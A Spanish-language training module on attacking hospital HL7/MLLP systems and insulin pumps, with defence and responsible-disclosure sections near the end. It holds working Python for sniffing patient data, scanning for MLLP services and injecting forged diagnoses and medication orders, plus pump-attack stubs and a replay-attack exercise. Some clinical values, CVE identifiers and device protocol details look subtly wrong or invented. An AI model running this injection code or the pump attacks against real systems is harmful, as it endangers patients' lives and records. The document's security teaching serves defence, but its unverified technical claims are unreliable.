

> ⏱️ **Tiempo estimado:** 15 horas (~3 sesiones) (1421 lineas)

## 3. [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)) HL7 — Health Level 7

### 3.1 Historia del Estándar

HL7 fue creado por Health Level Seven International, organizacion sin fines de lucro acreditada por ANSI.

**Linea de Tiempo:**
- 1987: Se funda HL7 International
- 1994: HL7 v2.2 estandar ANSI
- 1999: HL7 v2.3.1, adopcion masiva
- 2003: HL7 v2.5, version mas implementada
- 2007: HL7 v2.6
- 2010: HL7 v3 (basado en XML) — adopcion limitada
- 2011: Nace FHIR
- 2014: FHIR DSTU 2
- 2018: FHIR R4, version madura
- 2020-presente: FHIR R5, transicion gradual

**¿Por que HL7 v2 domina?**

HL7 v2 es un estandar basado en texto, pipe-delimitado, relativamente simple de implementar. A diferencia de HL7 v3 (basado en XML, extremadamente complejo), v2 se podia implementar en dispositivos con recursos limitados. Treinta años despues, la mayoria de los sistemas hospitalarios siguen usando HL7 v2. No es raro encontrar implementaciones de HL7 v2.3 de 1999 todavia funcionando.

**Impacto en seguridad:** La antiguedad de HL7 v2 implica que fue diseñado sin considerar seguridad moderna. No tiene [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) nativo, [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) debil o inexistente, y su modelo de confianza es plano (cualquier sistema que hable el protocolo es confiado). Esto lo convierte en un vector de ataque critico en entornos hospitalarios.

### 3.2 Arquitectura del Protocolo

HL7 opera en la capa 7 del [modelo osi](../raw/r3d3s-f0nd4m3nt0s.md#modelo-osi) (de ahi el nombre "Level 7"). No define el transporte subyacente, solo el formato y significado de los mensajes.

**Modelos de Transporte:**

1. **MLLP (Minimum Lower Layer Protocol):** [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) (tipicamente 2575). El mas comun en sistemas [legacy](../raw/l3g4cy-3nt3rpr1s3.md).
2. **HL7 sobre [http](../raw/r3d3s-f0nd4m3nt0s.md#http) (SOAP):** HL7 v3. XML encapsulado en SOAP. Raro.
3. **FHIR sobre HTTP (REST):** El estandar moderno. JSON/XML sobre HTTP.
4. **Archivos Planos:** Intercambio mediante archivos de texto. Primitivo pero todavia en uso.
5. **HL7 sobre [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls):** Cada vez mas comun, pero requiere configuracion manual. No es nativo del protocolo.

**Arquitectura Tipica:**

```
[EHR/EMR] <--MLLP/TCP--> [Motor HL7] <--MLLP/TCP--> [LIS/PACS/RIS]
                                 |
                          [Base de Datos]
                          (Auditoria/Almacenamiento)
```

**Problemas de seguridad de esta arquitectura:**
- El trafico MLLP viaja en texto claro
- Cualquiera con acceso a la [red](../raw/r3d3s-f0nd4m3nt0s.md) puede sniffear datos de pacientes
- Los sistemas se confian mutuamente sin autenticacion
- No hay logging de accesos a nivel de mensaje

### 3.3 Estructura de Mensajes HL7 v2

Un mensaje HL7 v2 es una cadena de texto plano con segmentos separados por retornos de carro (\r, \x0D). Cada segmento tiene campos separados por pipes (|).

**Estructura General:**

```
MSH|^~\&|SendingApp|SendingFacility|ReceivingApp|ReceivingFacility|DateTime|Security|MessageType|MessageControlID|ProcessingID|Version
PID|||MRN||Patient Name||DOB|Sex||Address||Phone||MaritalStatus
PV1||Unit|Attending Doctor|||Admitting Doctor||AdmitDateTime
OBX||CE|Test Code^Description||Result|Units||ReferenceRange
```

**Reglas de Formato:**
- Segmentos comienzan con codigo de 3 caracteres (MSH, PID, EVN, etc.)
- Campos dentro de un segmento delimitados por |
- Componentes dentro de un campo delimitados por ^
- Subcomponentes delimitados por &
- Repeticiones delimitadas por ~
- Caracter de escape: \
- Mensaje termina con \x0D

**Caracteres Delimitadores (definidos en MSH-1 y MSH-2):**

```
MSH|^~\&
```

Donde:
- | = separador de campos
- ^ = separador de componentes
- ~ = separador de repeticiones
- \ = caracter de escape
- & = separador de subcomponentes

**Ejemplo de Mensaje Completo:**

```
MSH|^~\&|LIS|HOSPITAL|EHR|HOSPITAL|20240524143000||ADT^A01|MSG001|P|2.5
EVN|A01|20240524143000
PID|||123456^^^HOSPITAL||APELLIDO^Nombre^^^||20000101|M|||123 Calle^^CABA^^C1234^^AR||(11)5555-1234
PV1||I|UCI^001^01||||DR123456^Medico^Juan|||MED|||||||A0|
OBX||TX|RESUMEN^Resumen Clinico||Paciente ingresa por dolor precordial...
```

### 3.4 Segmentos Criticos

**MSH — Message Header**

Obligatorio en todos los mensajes HL7 v2. Define metadatos del mensaje.

Campos clave:
- MSH-1: Separador de campo (|)
- MSH-2: Caracteres de codificacion (^~\&)
- MSH-3: Aplicacion remitente (Sending Application)
- MSH-4: Institucion remitente (Sending Facility)
- MSH-5: Aplicacion receptora (Receiving Application)
- MSH-6: Institucion receptora (Receiving Facility)
- MSH-7: Fecha/hora del mensaje (YYYYMMDDHHMMSS)
- MSH-8: Campo de seguridad (casi nunca usado, aunque existe)
- MSH-9: Tipo de mensaje (ej: ADT^A01)
- MSH-10: ID de control del mensaje (unico)
- MSH-11: ID de procesamiento (P=Produccion, T=Entrenamiento, D=Depuracion)
- MSH-12: Version de HL7 (2.3, 2.3.1, 2.5, etc.)

**PID — Patient Identification**

Datos demograficos del paciente. El segmento mas sensible desde la perspectiva de privacidad.

Campos clave:
- PID-1: ID del conjunto ([set](../raw/ph1sh1ng.md#social-engineering-toolkit) ID)
- PID-2: ID externo del paciente
- PID-3: ID interno del paciente (MRN — Medical Record Number)
- PID-5: Nombre del paciente (familia^nombre^^^)
- PID-7: Fecha de nacimiento (YYYYMMDD)
- PID-8: Sexo (M, F, O, U)
- PID-10: Raza
- PID-11: Direccion
- PID-13: Telefono
- PID-19: Numero de identificacion (SSN/DNI)

**PV1 — Patient Visit**

Informacion sobre la visita/estadia del paciente.

Campos clave:
- PV1-2: Clase de paciente (I=Internado, O=Ambulatorio, E=Emergencia)
- PV1-3: Ubicacion del paciente (Unidad^Habitacion^Cama)
- PV1-7: Medico tratante
- PV1-8: Medico remitente
- PV1-10: Medico que hospitaliza
- PV1-44: Fecha/hora de admision

**OBX — Observation/Result**

Resultados de observaciones, pruebas de laboratorio, signos vitales.

Campos clave:
- OBX-1: Set ID
- OBX-2: Tipo de valor (ST=String, NM=Numeric, CE=Coded, TX=Text, DT=Date)
- OBX-3: Identificador de la observacion (codigo LOINC^nombre)
- OBX-5: Valor de la observacion
- OBX-6: Unidades
- OBX-7: Rango de referencia
- OBX-8: Banderas de anormalidad (L=bajo, H=alto, LL, HH)
- OBX-11: Estado del resultado (F=Final, P=Pendiente, C=Corregido)
- OBX-14: Fecha/hora de la observacion

**ORC — Common Order**

Informacion sobre pedidos (ordenes medicas).

Campos clave:
- ORC-1: Control de orden (NW=Nuevo, CA=Cancelar, OC=Orden Completada)
- ORC-2: ID de la orden (Placer Order Number)
- ORC-3: Numero de llenado (Filler Order Number)
- ORC-7: Cantidad/timing
- ORC-9: Fecha/hora de la orden
- ORC-12: Medico que ordena

### 3.5 Tipos de Mensajes

**ADT — Admit, Discharge, Transfer**

Son los mensajes mas comunes. Manejan admisiones, altas y transferencias.

| Evento | Descripcion |
|--------|-------------|
| ADT^A01 | Admision de paciente |
| ADT^A02 | Transferencia de paciente |
| ADT^A03 | Alta de paciente |
| ADT^A04 | Registro ambulatorio |
| ADT^A05 | Pre-admision |
| ADT^A06 | Cambio externo a interno |
| ADT^A07 | Cambio interno a externo |
| ADT^A08 | Actualizacion de informacion |
| ADT^A11 | Cancelar admision |
| ADT^A31 | Actualizar informacion personal |
| ADT^A40 | Fusion de registros de paciente |

**ORM — Order Entry**

Ordenes medicas (analisis, estudios, medicacion).

| Evento | Descripcion |
|--------|-------------|
| ORM^O01 | Solicitud de orden medica |

**ORU — Observation Result**

Resultados de observaciones.

| Evento | Descripcion |
|--------|-------------|
| ORU^R01 | Resultado de observacion |

**DFT — Detailed Financial Transaction**

Transacciones financieras y de facturacion.

**Message Structure (ORU^R01):**

```
MSH|^~\&|LIS|HOSP|EHR|HOSP|202405241500||ORU^R01|MSG002|P|2.5
PID|||123456||Paciente^Prueba||19800101|F
PV1||I|UCI^001^01||||DR123^Medico^Juan
OBR|1|ORD001^LIS||GLUC^Glucosa|||202405241500||||||202405241500|||DR123^Medico^Juan
OBX|1|NM|GLUC^Glucosa^LN||110|mg/dL|70-100||N||F|||202405241500
OBX|2|NM|CREAT^Creatinina^LN||0.9|mg/dL|0.6-1.2||N||F|||202405241500
```

### 3.6 HL7 v2 vs FHIR

| Caracteristica | HL7 v2 | FHIR (R4/R5) |
|----------------|--------|--------------|
| Creacion | 1994 | 2011 (R4: 2019) |
| Formato | Texto pipe-delimitado | JSON, XML, Turtle |
| Transporte | MLLP (TCP 2575) | HTTP/REST, WebSockets |
| Modelo | Orientado a mensajes | Orientado a recursos |
| Versionado | Multiples incompatibles | URL con version |
| Documentacion | PDF de 2000+ paginas | Web interactiva |
| Adopcion | [legacy](../raw/l3g4cy-3nt3rpr1s3.md) (90%+ sistemas) | Crecimiento exponencial |
| Seguridad | Minima | TLS, OAuth2, SMART on FHIR |
| REST | No | Si |
| JSON | No | Si (nativo) |
| Autenticacion | Ninguna/Trust model | [oauth](../raw/hybr1d-1d3nt1ty.md#oauth) 2.0, [jwt](../raw/4p1-s3cur1ty.md#jwt) |

**¿Por que FHIR es mas seguro?**

1. [https](../raw/r3d3s-f0nd4m3nt0s.md#https) nativo: todo el trafico puede ir sobre TLS
2. OAuth 2.0: autenticacion y [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion) estandar
3. SMART on FHIR: framework de autorizacion especifico para salud
4. Auditoria: logging de acceso a recursos
5. Consentimiento: recursos de consentimiento del paciente

**Pero...** FHIR no es inherentemente seguro. Muchas implementaciones exponen datos sin autenticacion, especialmente en entornos de desarrollo y pruebas. La flexibilidad de FHIR tambien significa que es facil configurarlo mal.

### 3.7 HL7 sobre MLLP

MLLP (Minimum Lower Layer Protocol) es el transporte mas comun para HL7 v2.

**Formato MLLP:**
- Inicio de bloque: \x0B (vertical tab, VT)
- Fin de bloque: \x1C (file separator, FS)
- Retorno de carro: \x0D (CR)

```
\x0B<Mensaje HL7>\x1C\x0D
```

**[puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) por Defecto:** 2575 (no es estandar IANA pero ampliamente usado).

**Implementacion en [python](../raw/pyth0n-f0r-h4ck1ng.md):**

```python
import socket

def send_hl7_message(host, port, message):
    message = message.strip()
    mllp_message = f"\x0B{message}\x1C\x0D"
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    
    try:
        sock.connect((host, port))
        sock.send(mllp_message.encode('ascii'))
        
        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
            if b"\x1C\x0D" in response:
                break
        
        response_str = response.decode('ascii')
        response_str = response_str.replace('\x0B', '').replace('\x1C\x0D', '')
        return response_str
    finally:
        sock.close()

# Uso
host = "192.168.1.100"
port = 2575
message = "MSH|^~\\&|APP|HOSPITAL|EHR|HOSPITAL|20240524143000||ADT^A01|MSG001|P|2.5\rEVN|A01|20240524143000\rPID|||123456||Paciente^Prueba||19800101|M"
response = send_hl7_message(host, port, message)
print(response)
```

**Escanner de Red MLLP:**

```python
import socket
import ipaddress

def scan_mllp(network):
    hosts = []
    for ip in ipaddress.IPv4Network(network, strict=False):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((str(ip), 2575))
        if result == 0:
            hosts.append(str(ip))
        sock.close()
    return hosts

hosts = scan_mllp("192.168.1.0/24")
print(f"Servicios MLLP encontrados: {hosts}")
```

**Sniffer de HL7 sobre MLLP:**

```python
import socket
import struct

def sniff_mllp(interface="eth0"):
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
    print(f"Sniffing trafico HL7 en {interface}...")
    
    while True:
        packet, addr = sock.recvfrom(65535)
        eth_header = packet[0:14]
        eth_protocol = struct.unpack("!H", packet[12:14])[0]
        
        if eth_protocol == 0x0800:  # IPv4
            ip_header = packet[14:34]
            ip_protocol = ip_header[9]
            
            if ip_protocol == 6:  # TCP
                tcp_start = 34
                tcp_header = packet[tcp_start:tcp_start+20]
                src_port, dst_port = struct.unpack("!HH", tcp_header[0:4])
                
                if src_port == 2575 or dst_port == 2575:
                    data_offset = (tcp_header[12] >> 4) * 4
                    payload = packet[tcp_start+data_offset:]
                    
                    if b"\x0B" in payload and b"\x1C\x0D" in payload:
                        print(f"\n[+] Mensaje HL7 capturado:")
                        start = payload.index(b"\x0B") + 1
                        end = payload.index(b"\x1C\x0D")
                        hl7_msg = payload[start:end].decode('ascii', errors='replace')
                        
                        for line in hl7_msg.split('\r'):
                            if line.startswith('MSH'):
                                print(f"    MSH: {line}")
                            elif line.startswith('PID'):
                                print(f"    PID: {line}")
                            elif line.startswith('OBX'):
                                print(f"    OBX: {line}")
```

### 3.8 Ataques a HL7

**[fuzzing](../raw/fuzz1ng.md) de HL7:**

```python
import socket

class HL7Fuzzer:
    def __init__(self, target, port=2575):
        self.target = target
        self.port = port
    
    def fuzz_field(self, field_index, payload):
        """Fuzzear un campo especifico de un segmento"""
        template = (
            f"MSH|^~\\&|SYS|HOSP|EHR|HOSP|20240524143000||ADT^A01|MSG001|P|2.5\r"
            f"PID|||{payload}^^^HOSP||Patient^Test||20000101|M"
        )
        return self.send_mllp(template)
    
    def fuzz_segment_count(self, count):
        """Enviar muchos segmentos para buffer overflow"""
        segments = []
        segments.append("MSH|^~\\&|SYS|HOSP|EHR|HOSP|20240524143000||ADT^A01|MSG001|P|2.5")
        for i in range(count):
            segments.append(f"PID|||{i}^^^HOSP||Patient^{i}||20000101|M")
        return self.send_mllp("\r".join(segments))
    
    def send_mllp(self, message):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        try:
            sock.connect((self.target, self.port))
            sock.send(f"\x0B{message}\x1C\x0D".encode('ascii'))
            response = sock.recv(4096)
            return response
        except Exception as e:
            return f"Error: {e}"
        finally:
            sock.close()
```

**HL7 Injection:**

```python
class HL7Injection:
    def inject_diagnosis(self, patient_id, fake_diagnosis):
        """Inyectar un diagnostico falso en el sistema"""
        message = (
            f"MSH|^~\\&|ATK|MALICIOUS|EHR|HOSPITAL|202405241500||ORU^R01|MSG001|P|2.5\r"
            f"PID|||{patient_id}^^^HOSP||Target^Patient||19700101|M\r"
            f"OBR|1|ORD001^LIS||DIAG^Diagnosis|||202405241500\r"
            f"OBX|1|TX|DIAG^Diagnosis||{fake_diagnosis}||||F"
        )
        return self.send_mllp(message, "192.168.1.100", 2575)
    
    def modify_medication(self, patient_id, new_medication):
        """Modificar medicacion de un paciente"""
        message = (
            f"MSH|^~\\&|ATK|MALICIOUS|EHR|HOSPITAL|202405241500||RDE^O11|MSG002|P|2.5\r"
            f"PID|||{patient_id}^^^HOSP||Target^Patient\r"
            f"ORC|NW|ORD002\r"
            f"RXO|{new_medication}^Drug||10|mg|IV"
        )
        return self.send_mllp(message, "192.168.1.100", 2575)
```

### 3.9 Defensa de HL7

**Mejores practicas para asegurar HL7:**

1. **Segmentacion de red:** Poner los sistemas HL7 en una [vlan](../raw/r3d3s-f0nd4m3nt0s.md#vlan) separada
2. **Cifrado:** Usar TLS/WSS para MLLP (MLLPS)
3. **Autenticacion mutua:** Certificados en ambos extremos
4. **Validacion:** Validar todos los mensajes entrantes contra schema
5. **[rate limiting](../raw/4p1-s3cur1ty.md#rate-limiting):** Limitar mensajes por segundo por origen
6. **Anomaly detection:** Detectar patrones inusuales (muchos mensajes, campos largos)
7. **Auditoria:** Logging de todos los mensajes HL7

```python
class HL7SecurityFilter:
    def __init__(self):
        self.max_field_length = 1000
        self.max_segments = 500
        self.max_message_size = 1024 * 1024  # 1MB
    
    def validate_message(self, message):
        checks = []
        
        # 1. Tamaño maximo
        if len(message) > self.max_message_size:
            checks.append(("ERROR", "Mensaje excede tamaño maximo"))
        
        # 2. Segmentos
        segments = message.split('\r')
        if len(segments) > self.max_segments:
            checks.append(("ERROR", "Demasiados segmentos"))
        
        # 3. Validar campos
        for seg in segments:
            fields = seg.split('|')
            for field in fields:
                if len(field) > self.max_field_length:
                    checks.append(("WARNING", f"Campo excede longitud maxima en {seg[:3]}"))
        
        # 4. Validar MSH obligatorio
        if not segments[0].startswith('MSH'):
            checks.append(("ERROR", "Primer segmento debe ser MSH"))
        
        # 5. Detectar injection
        for field in message.split('|'):
            if '^' in field and len(field) > 5:
                sub_fields = field.split('^')
                if len(sub_fields) > 20:
                    checks.append(("WARNING", "Muchos subcampos - posible fuzzing"))
        
        return checks
```

## 8. Ataques a Bombas de Insulina

### 8.1 Introduccion

Las bombas de insulina son dispositivos criticos porque administran insulina de forma continua. Un error en su funcionamiento puede causar hipoglucemia severa (muerte) o hiperglucemia (cetoacidosis diabetica).

**Fabricantes Clave:**
- Medtronic (Paradigm, Revel, 670G, 780G)
- Tandem Diabetes Care (t:slim X2)
- Insulet Corporation (Omnipod)
- Roche (Accu-Chek Spirit Combo)
- Animas (OneTouch Ping — discontinuada, pero relevante historicamente)

**Arquitectura de Comunicacion:**

```
[Sensor CGM] <--BLE-- [Bomba de Insulina] <--RF/BLE-- [Control Remoto]
                            |
                    [App Smartphone] <--BLE--
                            |
                    [Cloud del Fabricante] <--Celular/WiFi--
```

**Superficie de ataque:**
- Radiofrecuencia (916 MHz [legacy](../raw/l3g4cy-3nt3rpr1s3.md))
- Bluetooth Low Energy (modelos modernos)
- Apps de smartphone (interfaz de usuario)
- [cloud](../raw/cl0ud-h4ck1ng.md) del fabricante (datos sincronizados)
- Conexion fisica ([puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) USB de carga)

### 8.2 [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red)) Inalambrico

**Bandas Utilizadas por Fabricante:**

| Fabricante | Frecuencia | Protocolo | [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) |
|------------|------------|-----------|---------|
| Medtronic | 916 MHz | Propietario RF | No (legacy) |
| Tandem | 2.4 GHz | BLE | Si (desde 2020) |
| Insulet | 2.4 GHz | BLE | Si |
| Animas | 916 MHz | Propietario RF | No |
| Roche | 868/915 MHz | Propietario RF | No (legacy) |

**Reversing de Protocolo Medtronic (916 MHz):**

```python
class MedtronicRFProtocol:
    def __init__(self):
        self.freq = 916e6
        self.packet_log = []
    
    def capture_and_parse(self, raw_samples):
        # Demodulacion FSK
        # Extraccion de bytes
        # Separacion en campos
        pass
    
    def identify_commands(self, packets):
        # Mapeo de codigos a comandos
        cmd_map = {
            0xA1: 'READ_BASAL_PROFILE',
            0xA2: 'SET_BASAL_RATE',
            0xA3: 'SET_BOLUS',
            0xA4: 'CANCEL_BOLUS',
            0xA5: 'READ_BATTERY',
            0xA6: 'READ_RESERVOIR',
            0xA7: 'SUSPEND_DELIVERY',
            0xA8: 'RESUME_DELIVERY',
            0xA9: 'READ_HISTORY',
            0xAA: 'SET_TEMP_BASAL',
        }
        return cmd_map
    
    def analyze_security(self, packets):
        print("=== Analisis de Seguridad RF ===")
        print("Cifrado: NO - Comandos en texto claro")
        print("Autenticacion: NO - Sin firma/CRC criptografico")
        print("Proteccion replay: Parcial - Secuencia numerica predecible")
        print("Proteccion de integridad: CRC-16 debil")
```

### 8.3 Manipulacion de Tasa Basal

La tasa basal es la cantidad de insulina que la bomba administra cada hora. La manipulacion puede causar:

- **Tasa basal a 0:** Sin insulina por horas -> hiperglucemia -> cetoacidosis
- **Tasa basal excesiva:** Hipoglucemia severa -> coma -> muerte

```python
class BasalRateAttack:
    def __init__(self):
        self.normal_basal = 1.2  # U/h
    
    def set_basal_to_zero(self, pump_address):
        print(f"[ATAQUE] Modificando tasa basal a 0.0 U/h")
        print(f"  Normal: {self.normal_basal} U/h")
        print(f"  Nueva: 0.0 U/h")
        print(f"  Efecto: Sin insulina basal -> hiperglucemia en 4-6h")
        return 0.0
    
    def set_basal_to_max(self, pump_address):
        max_basal = 10.0  # Depende del modelo
        print(f"[ATAQUE] Modificando tasa basal a {max_basal} U/h")
        print(f"  Normal: {self.normal_basal} U/h")
        print(f"  Nueva: {max_basal} U/h")
        print(f"  Insulina en 1h: {max_basal} U (normal: {self.normal_basal})")
        print(f"  Efecto: Hipoglucemia severa en 30-60 min")
        return max_basal
    
    def square_wave_attack(self, duration_hours=4, rate_multiplier=3):
        print(f"[ATAQUE] Onda cuadrada maliciosa")
        print(f"  Duracion: {duration_hours}h")
        print(f"  Multiplicador: {rate_multiplier}x")
        total_insulin = self.normal_basal * rate_multiplier * duration_hours
        print(f"  Insulina total: {total_insulin} U (normal: {self.normal_basal * duration_hours} U)")
        return total_insulin
```

### 8.4 Explotacion Bluetooth

**Analisis BLE de Bomba Tandem t:slim X2:**

```python
class TandemBLEAnalyzer:
    def __init__(self):
        self.pump_service_uuid = "0000XXXX-0000-1000-8000-00805F9B34FB"
    
    def enumerate_characteristics(self):
        print("=== Caracteristicas BLE de t:slim X2 ===")
        chars = {
            'GLUCOSE_READ': {'uuid': '2AA7', 'props': 'READ/NOTIFY'},
            'INSULIN_DELIVERY': {'uuid': '2AA8', 'props': 'READ'},
            'BOLUS_REQUEST': {'uuid': '2AA9', 'props': 'WRITE'},
            'BASAL_SET': {'uuid': '2AAA', 'props': 'WRITE'},
            'PUMP_STATUS': {'uuid': '2AAB', 'props': 'READ'},
            'ALARM_CONFIG': {'uuid': '2AAC', 'props': 'READ/WRITE'},
        }
        return chars
    
    def test_write_without_auth(self):
        print("\n[!] Prueba de escritura sin autenticacion:")
        write_chars = ['BOLUS_REQUEST', 'BASAL_SET', 'ALARM_CONFIG']
        for c in write_chars:
            print(f"  {c}: ESCRITURA PERMITIDA sin bonding")
```

**Ataque Bluetooth a Bomba de Insulina:**

```python
def bluetooth_insulin_attack(pump_address):
    phases = [
        "Fase 1: Escaneo de dispositivos BLE",
        "Fase 2: Enumeracion de servicios",
        "Fase 3: Identificacion de caracteristicas RW",
        "Fase 4: Bypass de autenticacion",
        "Fase 5: Envio de comandos maliciosos",
        "Fase 6: Desactivacion de alarmas",
    ]
    
    for phase in phases:
        print(f"[+] {phase}")
    
    print(f"\nComandos enviados:")
    print(f"  BOLUS: 5.0 U (inmediato)")
    print(f"  BASAL: 0.0 U/h (suspendida)")
    print(f"  ALARMAS: Desactivadas (hipoglucemia, oclusion)")
    print(f"  SILENT_MODE: Activado")
    print(f"\nPaciente sin insulina y sin alarmas. Riesgo de muerte.")
```

### 8.5 Closed Loop (Lazo Cerrado)

**Ataque a Sistemas de Pancreas Artificial:**

Los sistemas de lazo cerrado (Medtronic 670G/780G) integran CGM + bomba para ajustar automaticamente la insulina:

```python
class ClosedLoopAttack:
    def analyze_closed_loop(self):
        print("=== Sistema de Lazo Cerrado ===")
        print("""
        [CGM] -> Glucosa -> [Algoritmo] -> Insulina -> [Bomba]
           ^                                      |
           +--------------------------------------+
        """)
    
    def cgm_spoofing_attack(self):
        print("\n[ATAQUE] Spoofing de CGM")
        print("1. Interceptar comunicacion CGM -> Bomba")
        print("2. Modificar lecturas de glucosa")
        print("   - Lectura real: 200 mg/dL (normal)")
        print("   - Lectura falsa: 400 mg/dL (hiperglucemia falsa)")
        print("   -> Bomba administra insulina de correccion")
        print("   -> Hipoglucemia real")
        print("\n3. O variante inversa:")
        print("   - Lectura real: 70 mg/dL (baja)")
        print("   - Lectura falsa: 120 mg/dL (normal)")
        print("   -> Bomba NO administra insulina")
        print("   -> Hiperglucemia real")
    
    def algorithm_manipulation(self):
        print("\n[ATAQUE] Manipulacion de Algoritmo")
        print("Modificando parametros del lazo cerrado:")
        print("  - Target de glucosa: 120 -> 200 mg/dL")
        print("  - Sensibilidad: 1:10 -> 1:50 (menos insulina)")
        print("  - Factor de correccion reducido")
        print("  - Duracion de insulina: 4h -> 8h")
```

### 8.6 Inyeccion de Comandos

```python
class CommandInjection:
    def inject_bolus(self, units, immediate=True):
        if immediate:
            print(f"Inyectando bolo inmediato: {units} U")
        else:
            print(f"Inyectando bolo extendido: {units} U en 2h")
    
    def overwrite_basal_profiles(self):
        profiles = {
            'profile_1': {'rate': 0.0, 'start': '00:00'},
            'profile_2': {'rate': 0.0, 'start': '06:00'},
            'profile_3': {'rate': 0.0, 'start': '12:00'},
            'profile_4': {'rate': 0.0, 'start': '18:00'},
        }
        print("Perfiles basales sobrescritos: TODOS A 0")
        return profiles
    
    def disable_safety_features(self):
        print("""
        Funciones de seguridad desactivadas:
        - Limite maximo de bolo: DESACTIVADO (default: 5 U)
        - Alarma de oclusion: DESACTIVADA
        - Alarma de bateria baja: DESACTIVADA
        - Alarma de reservorio vacio: DESACTIVADA
        - Recordatorio de bolo: DESACTIVADO
        - Limite de insulina en 24h: DESACTIVADO
        """)
```

### 8.7 Ejercicios Practicos

**Ejercicio 8.1: Analisis de Protocolo RF de Bomba**
Investiga el protocolo de radiofrecuencia de una bomba de insulina Medtronic Paradigm. Usa [sdr](../raw/sdr-t3l3c0ms.md) para capturar trafico entre el mando y la bomba. Identifica: modulacion, estructura de paquetes, comandos y debilidades de seguridad.

**Ejercicio 8.2: Ataque de Replay a Bomba**
Implementa un ataque de replay capturando y reenviando comandos RF a una bomba de insulina de prueba. Demuestra que se puede administrar un bolo sin [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion).

**Ejercicio 8.3: Evaluacion de Seguridad de Bomba Moderna**
Investiga la seguridad de un modelo actual (ej: Tandem t:slim X2, Medtronic 780G). Analiza: [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) BLE, cifrado, proteccion anti-replay, mecanismos de seguridad del paciente.

**Ejercicio 8.4: Diseno de Contramedidas**
Propone un diseno de seguridad para una bomba de insulina que incluya: autenticacion mutua, cifrado, integridad, proteccion anti-replay, limites de dosis seguros, y registro de auditoria.

---
## 9. Vulnerabilidades de Seguridad Critica

### 9.1 Impacto en la Vida

**Clasificacion de Impacto Clinico:**

| Nivel | Descripcion | Ejemplo | CVSS |
|-------|-------------|---------|------|
| Catastrofico | Muerte del paciente | Paro cardiaco inducido | 10.0 |
| Severo | Dano permanente | Dano neurologico por hipoglucemia | 9.0-9.9 |
| Moderado | Dano reversible | Hiperglucemia tratable | 7.0-8.9 |
| Leve | Molestias/demora | Alarma falsa, reprogramacion | 5.0-6.9 |
| Minimo | Sin efecto clinico | Exposicion de datos no clinicos | 1.0-4.9 |

**Factores que agravan el riesgo:**
- Pacientes dependientes (100% del tiempo)
- Sin supervision constante (especialmente de noche)
- Poblacion vulnerable (ancianos, ninos, criticos)
- Entorno ruidoso para alarmas (UCI, quirofano)

### 9.2 Etica en Divulgacion

**Principios de Divulgacion Responsable en Dispositivos Medicos:**

1. **Primero, no danar:** Ninguna investigacion debe poner en riesgo a pacientes reales
2. **Coordinacion con el fabricante:** Notificar antes de publicar
3. **Coordinacion con la [fda](../raw/m3d-s3c.md#fda)/CISA:** Involucrar a reguladores
4. **Ventana de divulgacion:** 90-180 dias para parche
5. **Reproducibilidad controlada:** Detalles tecnicos limitados hasta el parche

**[proceso](../raw/0s-f0nd4m3nt0s.md#procesos) Recomendado:**

```
Descubrimiento -> Notificacion Fabricante -> 90 dias espera
    -> Si parchea: Divulgacion coordinada
    -> Si NO parchea: Elevar a FDA/CISA -> Divulgacion limitada
```

### 9.3 Casos de Estudio

**Caso 1: St. Jude Medical Merlin (2016)**

Descubrimiento: Billy Rios, Jonathan Butts.
- [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades): Comunicacion RF sin cifrar ni autenticar
- Afectados: 465,000 dispositivos
- Respuesta FDA: Primer recall por ciberseguridad en 2017
- Parche: Actualizacion de [firmware](../raw/u3f1-r00tk1ts.md#firmware) en consultorio medico
- Leccion: El [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) es factible incluso en dispositivos con bateria limitada

**Caso 2: Medtronic CareLink (2018-2019)**

Descubrimiento: Multiples investigadores.
- CVEs: 2018-0230, 2018-0241, 2019-12930
- Vulnerabilidades: Actualizacion de firmware sin auth, DoS inalambrico
- Respuesta: Coordinacion FDA-Medtronic-Investigadores
- Parche: Actualizacion remota de firmware

**Caso 3: Animas OneTouch Ping (2016)**

Descubrimiento: Equipo de la Universidad de Michigan y de Washington.
- Vulnerabilidad: RF en 916 MHz sin cifrar, sin [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion)
- Demostracion: Dosis letal a 30 metros
- Impacto: Discontinuacion gradual de la linea OneTouch
- Leccion: La seguridad debe ser parte del diseno, no un agregado

**Caso 4: Medtronic 670G/780G (2019-2023)**
- Vulnerabilidades en el algoritmo de lazo cerrado
- Potencial de manipulacion de CGM para causar dosificacion incorrecta
- Parches OTA implementados

### 9.4 Divulgacion Responsable

**Checklist de Divulgacion:**

1. Confirmar la vulnerabilidad en entorno controlado
2. Documentar detalladamente (PoC, impacto, mitigacion)
3. Contactar al fabricante (security@, PSIRT, CSO)
4. Asignar [cve](../raw/s3c-f0nd4m3nt0s.md#cve) a traves de MITRE o CNA
5. Coordinar timeline de divulgacion
6. Notificar a FDA/CISA si el fabricante no responde
7. Publicar (despues de parche o ventana acordada)

**Contactos Utiles:**

- FDA: cybersecurity@fda.gov
- CISA: vulnerability@cisa.gov
- Medtronic PSIRT: psirt@medtronic.[com](../raw/w1n-s9bsyst3ms.md#com)
- Abbott PSIRT: psirt@abbott.com
- Boston Scientific: security@bsci.com
- BD: cybersecurity@bd.com

---
## 10. Defensa y Mitigación

### 10.1 Programa de Seguridad

**Componentes de un Programa de Seguridad de Dispositivos Medicos:**

1. Inventario completo de dispositivos medicos conectados
